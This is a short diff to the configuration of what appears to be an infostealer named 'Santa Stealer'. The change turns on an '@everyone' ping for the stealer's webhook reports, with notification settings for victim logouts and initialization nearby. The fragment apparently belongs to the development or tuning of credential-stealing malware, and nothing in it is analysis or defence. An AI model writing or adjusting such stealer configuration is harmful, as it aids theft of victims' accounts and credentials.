@@ -17,7 +17,7 @@ var config = {
 
     notify_on_logout: false,
     notify_on_initialization: false,
-    ping: [false, "@everyone"],
+    ping: [true, "@everyone"],
 
     embed: {
         username: "Santa Stealer",
